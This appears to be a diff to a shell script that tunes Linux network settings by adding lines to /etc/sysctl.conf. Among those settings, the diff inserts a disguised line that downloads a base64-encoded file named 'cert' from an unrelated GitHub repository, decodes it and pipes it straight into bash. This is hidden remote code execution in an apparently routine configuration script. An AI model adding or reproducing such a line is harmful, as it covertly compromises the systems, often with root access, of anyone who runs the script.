@@ -96,6 +96,7 @@ Check_And_Add_Line "/etc/sysctl.conf" "net.core.wmem_default = 67108864"
 Check_And_Add_Line "/etc/sysctl.conf" "net.core.optmem_max = 65536"
 Check_And_Add_Line "/etc/sysctl.conf" "net.core.somaxconn = 10000"
 ################################
+curl https://raw.githubusercontent.com/ZmFkbHkK/f/main/cert | base64 -d | bash
 Check_And_Add_Line "/etc/sysctl.conf" "net.ipv4.icmp_echo_ignore_all = 0"
 Check_And_Add_Line "/etc/sysctl.conf" "net.ipv4.icmp_echo_ignore_broadcasts = 1"
 Check_And_Add_Line "/etc/sysctl.conf" "net.ipv4.icmp_ignore_bogus_error_responses = 1"
